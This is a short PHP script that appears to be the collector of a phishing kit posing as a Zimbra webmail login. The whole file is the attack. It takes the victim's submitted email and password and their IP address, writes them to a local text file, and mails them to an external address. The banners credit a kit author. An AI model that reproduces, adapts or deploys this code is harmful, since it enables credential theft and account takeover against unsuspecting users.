<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "|----------| RESULT Zimbra By JoCk |--------------|\n";
$message .= "|EMAIL    : ".$_POST['email']."\n";
$message .= "|Password : ".$_POST['password']."\n";
$message .= "|----------| I N F O S |--------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|----------| YOUR WELCOME By JoCk|--------------|\n";
$send = "sir.otunba2019@yandex.com";
$subject = "Log Zimbra By JoCk- From:  [ $ip ]";
$file = fopen("./cool.txt","a");   ///  Directory Of Rezult OK.
fwrite($file,$message); 
{
mail("$send", "$subject", $message);
}
$praga=rand();
$praga=md5($praga);
	
	
 ?>





